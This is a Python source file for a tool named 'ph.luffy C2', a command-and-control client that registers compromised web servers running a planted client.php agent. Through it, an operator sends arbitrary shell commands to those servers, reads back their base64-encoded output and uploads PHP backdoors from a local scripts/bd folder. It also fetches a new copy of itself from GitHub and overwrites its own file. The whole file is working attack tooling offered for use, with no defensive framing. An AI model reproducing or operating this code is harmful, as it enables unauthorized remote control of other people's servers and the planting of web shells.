import requests, json, os, base64, platform, sys, argparse

# ANSI color codes
GREEN = "\033[92m"
SILVER = "\033[37m"
BLUE = "\033[94m"
RED = "\033[1;31m"
YELLOW = "\033[93m"
RESET = "\033[0m"
SESSION_FILE = "_sessions.json"
TOOL_NAME = "ph.luffy C2"
TOOL_VERSION = "1.0"
TOOL_AUTHOR = "Coded by ph.luffy"
GITHUB_RAW_URL = "https://raw.githubusercontent.com/kaitolegion/c2/main/assets/c2.py"

def check_for_update():
    try:
        r = requests.get(GITHUB_RAW_URL, timeout=5)
        if r.status_code == 200:
            remote_code = r.text
            # Extract remote version string
            for line in remote_code.splitlines():
                if "TOOL_VERSION" in line and "=" in line:
                    remote_version = line.split("=")[1].strip().strip('"\'')
                    break
            else:
                print(f"{YELLOW}[!]{RESET} Could not find version info in remote file.")
                return

            if remote_version != TOOL_VERSION:
                print(f"{YELLOW}[!]{RESET} Update available: {GREEN}{remote_version}{RESET} (current: {TOOL_VERSION})")
                choice = input(f"{BLUE}[?]{RESET} Do you want to update now? [Y/n]: ").strip().lower()
                if choice in ["y", "yes", ""]:
                    apply_update(r.text)
                else:
                    print(f"{YELLOW}[!]{RESET} Skipping update.")
        else:
            print(f"{YELLOW}[!]{RESET} Failed to check for updates (HTTP {r.status_code})")
    except Exception as e:
        print(f"{YELLOW}[!]{RESET} Update check failed: {e}")


def apply_update(new_code):
    try:
        with open("c2.py", "w", encoding="utf-8") as f:
            f.write(new_code)
        print(f"{GREEN}[+]{RESET} Update complete!")
        print(f"{BLUE}[*]{RESET} Please restart the tool.")
        exit()
    except Exception as e:
        print(f"{YELLOW}[!]{RESET} Update failed: {e}")

def banner():
    print(f"""{SILVER}
               _                                         
              | |                                        
              | |===( )   //////                         
              |_|   |||  | o o|                          
                     ||| ( c  )                  ____    
                      ||| \\= /                  ||   \\_  
                       ||||||                   ||     | 
                       ||||||                ...||__/|-" 
                       ||||||             __|________|__ 
                         |||             |______________|
                         |||             || ||      || ||
                         |||             || ||      || ||
                   ------|||-------------||-||------||-||
                         |__>            || ||      || ||{RESET}


      {GREEN}C2{RESET} : version {YELLOW}1.0{RESET}
      Team: @purexploit
      Coded by @ph.luffy
{RESET}
    """)
    print(SILVER + "-" * 40 + RESET)
    print(f"{GREEN}[+] Active Sessions:{RESET}")
    for i, sid in enumerate(sessions.keys(), start=1):
        server = sessions[sid].get("server", "unknown")
        print(f"{BLUE}[{i}]{RESET} {sid} - {server}")
    print(SILVER + "-" * 40 + RESET)
    print(f"{GREEN}[+] Commands:{RESET} (only when connected)")
    print(f"{SILVER}[*] spawn shell [name]{RESET} :   {SILVER}Upload your shell (e.g, spawn shell up.php){RESET}")
    print(f"{SILVER}[*] spawn list{RESET}         :   {SILVER}List of available backdoors{RESET}")
    print(f"{SILVER}[*] about{RESET}              :   {SILVER}About this tool{RESET}")
    print(f"{SILVER}[*] clear{RESET}              :   {SILVER}Clear commands{RESET}")
    print(f"{SILVER}[*] exit{RESET}               :   {SILVER}Back to home{RESET}")
    print(SILVER + "-" * 40 + RESET)
    print(f"{GREEN}[+] Commands:{RESET} (not connected)")
    print(f"{SILVER}[*] n{RESET}                  :   {SILVER}For new target{RESET}")
    print(f"{SILVER}[*] kill [num]{RESET}         :   {SILVER}Remove session number [num]{RESET}")
    print(f"{SILVER}[*] update{RESET}             :   {SILVER}Check for updates{RESET}")
    print(f"{SILVER}[*] CTRL+C{RESET}             :   {SILVER}Exit the program{RESET}")
    print(SILVER + "-" * 40 + RESET)

def load_sessions():
    try:
        with open(SESSION_FILE, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError:
        # File is empty or invalid JSON, return empty dict or list as fallback
        return {}
    except FileNotFoundError:
        # File doesn't exist yet, return empty dict or list
        return {}

def save_sessions(sessions):
    with open(SESSION_FILE, "w") as f:
        json.dump(sessions, f, indent=4)

def register(new_server=None):
    while True:
        if new_server is None:
            new_server = input(f"{BLUE}Enter new target: {RESET}").strip()
        if not new_server:
            print(f"{YELLOW}[!]{RESET} URL cannot be empty. Please enter a valid URL (e.g., http://target/path/client.php)")
            new_server = None
            continue
        if not (new_server.startswith("http://") or new_server.startswith("https://")):
            print(f"{YELLOW}[!]{RESET} URL must start with http:// or https://")
            new_server = None
            continue
        try:
            r = requests.get(new_server, params={"action": "register"})
            r.raise_for_status()
            session = r.json()
            session["server"] = new_server
            sessions = load_sessions()
            sessions[session["id"]] = session
            save_sessions(sessions)
            return session
        except requests.exceptions.MissingSchema:
            print(f"{YELLOW}[!]{RESET} Invalid URL. Please include the scheme (http:// or https://).")
        except requests.exceptions.ConnectionError:
            print(f"{YELLOW}[!]{RESET} Could not connect to {new_server}. Please check the URL and try again.")
        except requests.exceptions.HTTPError as e:
            print(f"{YELLOW}[!]{RESET} HTTP error: {e}")
        except Exception as e:
            print(f"{YELLOW}[!]{RESET} Error: {e}")
        # Prompt again if error
        new_server = None

def send_command(session, cmd):
    server = session.get("server")
    r = requests.get(server, params={"action": "push", "id": session["id"], "cmd": cmd})
    return r.json()

def get_last_output(session):
    server = session.get("server")
    r = requests.get(server, params={"action": "fetch_result", "id": session["id"]})
    res = r.json()
    out = res.get("output", "")
    try:
        decoded = base64.b64decode(out).decode(errors="ignore")
    except:
        decoded = out
    return decoded

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def about_tool():
    print(BLUE + "=" * 40 + RESET)
    print(f"{GREEN}{TOOL_NAME} {TOOL_VERSION}{RESET}")
    print(f"{SILVER}{TOOL_AUTHOR}{RESET}")
    print(f"{YELLOW}Description:{RESET} {SILVER}Remote C2 Controller for registered agents{RESET}")
    print(f"{YELLOW}Platform:{RESET} {SILVER}{platform.system()} {platform.release()}{RESET}")
    print(BLUE + "=" * 40 + RESET)

def upload_shell(session, shell_name="shell.php"):
    possible_paths = [
        os.path.join(os.getcwd(), "scripts", "bd", shell_name),
        os.path.join(os.getcwd(), shell_name)
    ]
    shell_path = None
    for path in possible_paths:
        if os.path.exists(path):
            shell_path = path
            break

    if not shell_path:
        print(f"{YELLOW}[!]{RESET} {shell_name} not found in scripts/bd/ or current directory")
        return

    server = session.get("server")
    try:
        with open(shell_path, 'rb') as f:
            files = {'file': f}
            r = requests.post(server, params={"action": "upload", "name": shell_name}, files=files)
            resp = r.json()
            if resp.get("status") == "uploaded":
                print(f"{GREEN}[+]{RESET} Uploaded {shell_name} to server as {BLUE}{resp.get('file')}{RESET}")
            else:
                print(f"{YELLOW}[!]{RESET} Upload failed: {resp.get('error', 'Unknown error')}")
    except Exception as e:
        print(f"{YELLOW}[!]{RESET} Upload error: {e}")

# -------- MAIN --------

def main():
    parser = argparse.ArgumentParser(description="ph.luffy C2")
    parser.add_argument('-n', '--new', metavar='URL', help='Register new target (e.g., https://target.com/client.php)')
    args = parser.parse_args()

    clear_screen()
    # check first if there is update
    check_for_update()
    global sessions
    sessions = load_sessions()
    try:
        session = None
        # If -n/--new argument is provided, register new target immediately
        if args.new:
            session = register(args.new)
        elif sessions:
            banner()
            while True:
                try:
                    choice = input(f"{GREEN}px@security{RED}~{BLUE}$ {RESET}").strip()
                except KeyboardInterrupt:
                    print(f"\n{YELLOW}[!]{RESET} Exiting.")
                    sys.exit(0)
                if choice.lower() == "n":
                    session = register()
                    break
                elif choice.lower().startswith("kill "):
                    parts = choice.split()
                    if len(parts) == 2 and parts[1].isdigit():
                        kill_num = int(parts[1])
                        session_keys = list(sessions.keys())
                        if 1 <= kill_num <= len(session_keys):
                            sid_to_kill = session_keys[kill_num-1]
                            del sessions[sid_to_kill]
                            save_sessions(sessions)
                            print(f"{YELLOW}[!]{RESET} Session {sid_to_kill} removed.")
                            # Refresh banner after kill
                            if sessions:
                                banner()
                            else:
                                print(f"{YELLOW}[!]{RESET} No sessions left. Registering new session...")
                                session = register()
                                break
                        else:
                            print(f"{YELLOW}[!]{RESET} Invalid session number for kill.")
                    else:
                        print(f"{YELLOW}[!]{RESET} Usage: kill [num]")
                    continue
                else:
                    try:
                        session_id = list(sessions.keys())[int(choice)-1]
                        session = sessions[session_id]
                        break
                    except:
                        print(f"{YELLOW}[!]{RESET} Invalid choice. Try again or use 'n' or 'kill [num]'.")
        else:
            session = register()
        print(f"{GREEN}[+]{RESET} session connected: {BLUE}{session['id']}{RESET}")
        while True:
            try:
                cmd = input(f"{GREEN}px@security({RED}{session['id']}{SILVER})$ {RESET}").strip()
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected. Exiting.")
                break

            # Special commands
            if cmd.lower() in ["exit", "quit"]:
                # On exit, reset session's cwd to home (if possible)
                if 'home' in session:
                    session['cwd'] = session['home']
                    # Optionally, update the session on disk
                    sessions[session['id']] = session
                    save_sessions(sessions)
                print(f"{YELLOW}[!]{RESET} Returning to session selection/home.")
                return main()  # Go back to main menu
            elif cmd.lower() == "clear":
                clear_screen()
                continue
            elif cmd.lower() == "about":
                about_tool()
                continue
            elif cmd.lower().startswith("spawn shell"):
                # Parse shell name if provided
                parts = cmd.split()
                if len(parts) == 3:
                    shell_name = parts[2]
                else:
                    shell_name = "shell.php"
                upload_shell(session, shell_name)
                continue
            elif cmd.lower().startswith("spawn list"):
                files_dir = "scripts/bd/"
                try:
                    files = os.listdir(files_dir)
                    print(f"{GREEN}[+]{RESET} Available:")
                    for f in files:
                        print(f"  {SILVER}{f}{RESET}")
                except Exception as e:
                    print(f"{YELLOW}[!]{RESET} Could not list files in {files_dir}: {e}")
                continue
            # Send to target
            send_command(session, cmd)
            output = get_last_output(session)
            print(f"{GREEN}{output}{RESET}")
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()
